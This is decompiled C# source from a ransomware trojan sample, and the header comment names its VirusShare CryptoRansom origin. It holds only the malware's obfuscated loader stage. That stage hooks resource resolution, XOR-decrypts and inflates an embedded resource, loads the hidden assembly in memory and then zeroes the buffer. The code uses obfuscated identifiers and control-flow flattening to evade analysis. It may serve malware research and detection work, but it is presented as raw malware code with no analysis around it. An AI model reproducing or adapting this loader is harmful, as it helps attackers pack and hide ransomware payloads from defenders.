// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: SmartAssemblyReport, Version=0.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC88CA45-0F9B-4505-AD43-DCCBD3AE6C30
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Crypt.hao-e3c6800c58d985ae39bc4ee601c1701ff63705ea8a1a35a87e21ebfc30d96d37.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly 鷬貚鑇煤\uFFFD\uEB49樈\uE091;

  static \u003CModule\u003E() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.䠷櫋\uFFFD很ᦥ\u2A18䓯萀);

  internal static Assembly 䠷櫋\uFFFD很ᦥ\u2A18䓯萀(object sender, ResolveEventArgs args)
  {
label_0:
    while ((object) \u003CModule\u003E.鷬貚鑇煤\uFFFD\uEB49樈\uE091 == null)
    {
      Stream manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("㽗ﹻ靷巶\uF50Eྋ떔波");
      byte[] buffer = new byte[manifestResourceStream.Length];
      int num1 = 4;
      while (true)
      {
        int index;
        byte num2;
        switch (num1)
        {
          case 0:
            goto label_0;
          case 2:
            num2 = (byte) (622800537 + 686529939 - 1309330268);
            index = 0;
            num1 = 1;
            continue;
          case 3:
            goto label_5;
          case 4:
            manifestResourceStream.Read(buffer, 0, buffer.Length);
            num1 = 2;
            continue;
          case 5:
            num2 = (byte) ((int) num2 * (1768404449 ^ 1148716286 ^ 340365339 - 249218286 ^ 1131934896 ^ 1795591708) % ((24508649 ^ 991330134) - 979601087));
            ++index;
            break;
        }
        if (index < buffer.Length)
        {
          buffer[index] = (byte) ((uint) buffer[index] ^ (uint) num2);
          num1 = 5;
        }
        else
          num1 = 3;
      }
label_5:
      BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress));
label_10:
      try
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        int num3 = 1;
        while (true)
        {
          switch (num3)
          {
            case 0:
              goto label_10;
            case 2:
              goto label_13;
            default:
              \u003CModule\u003E.鷬貚鑇煤\uFFFD\uEB49樈\uE091 = Assembly.Load(numArray);
              num3 = 2;
              continue;
          }
        }
label_13:
        Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
        break;
      }
      finally
      {
        binaryReader?.Dispose();
      }
    }
    return Array.IndexOf<string>(\u003CModule\u003E.鷬貚鑇煤\uFFFD\uEB49樈\uE091.GetManifestResourceNames(), args.Name) == -1 ? (Assembly) null : \u003CModule\u003E.鷬貚鑇煤\uFFFD\uEB49樈\uE091;
  }
}
